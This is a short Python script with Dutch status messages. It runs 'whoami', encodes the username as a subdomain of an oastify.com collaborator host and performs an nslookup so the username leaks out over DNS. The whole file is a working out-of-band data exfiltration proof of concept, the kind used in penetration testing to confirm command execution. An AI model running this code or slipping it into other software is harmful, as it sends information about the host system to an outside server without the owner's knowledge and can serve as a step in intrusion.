import subprocess
import os
import re

def exfiltrate_data():

    oastify_base = "je1vt7sczrmwk7nyh1ycdmrgw72yqseh.oastify.com"

    try:

        raw_user = subprocess.check_output("whoami", shell=True).decode('utf-8').strip()

        clean_user = re.sub(r'[^a-zA-Z0-9]', '', raw_user)

        full_target = f"{clean_user}.{oastify_base}"
        
        print(f"[*] Verzend data naar: {full_target}")

        subprocess.run(["nslookup", full_target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("[+] Klaar. Controleer je Oastify dashboard.")

    except Exception as e:
        print(f"[-] Fout opgetreden: {e}")

if __name__ == "__main__":
    exfiltrate_data()
